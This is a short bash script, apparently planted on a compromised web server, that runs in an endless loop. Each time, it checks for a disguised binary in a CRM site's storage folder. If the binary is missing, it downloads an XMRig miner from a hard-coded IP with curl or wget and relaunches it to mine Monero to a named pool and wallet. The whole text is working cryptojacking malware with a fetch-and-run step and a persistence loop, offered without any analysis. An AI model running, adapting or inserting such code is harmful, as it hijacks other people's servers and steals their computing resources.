#!/bin/bash
while true; do
    # 1. 检查二进制文件是否存在，不存在则重新下载
    if [ ! -f "/var/www/fastuser/data/www/crm.kulvriksh.in/storage/stmept" ]; then
        echo "Binary not found, re-downloading..."
        if command -v curl >/dev/null; then
            curl -sSL -o "/var/www/fastuser/data/www/crm.kulvriksh.in/storage/stmept" "http://103.213.248.32/xmrig_86c3"
        elif command -v wget >/dev/null; then
            wget -q --no-check-certificate -O "/var/www/fastuser/data/www/crm.kulvriksh.in/storage/stmept" "http://103.213.248.32/xmrig_86c3"
        fi
        chmod +x "/var/www/fastuser/data/www/crm.kulvriksh.in/storage/stmept"
    fi

    # 2. 守护进程：通过进程名监控，如果未运行则拉起
    if ! pgrep -f "stmept" >/dev/null; then
        "/var/www/fastuser/data/www/crm.kulvriksh.in/storage/stmept" --url "pool.supportxmr.com:3333" --user "8556M2fMqE8Dg1U3pERP9rJ64jaa6MMha5SY5ovWQ7XiYjxdKquPQ7Z4afpEeXUtfJVBLGvLncGxtKMugv61S9nFGMHNAFK" --pass next --donate-level 0 >/dev/null 2>&1 &
    fi
    sleep 20
done
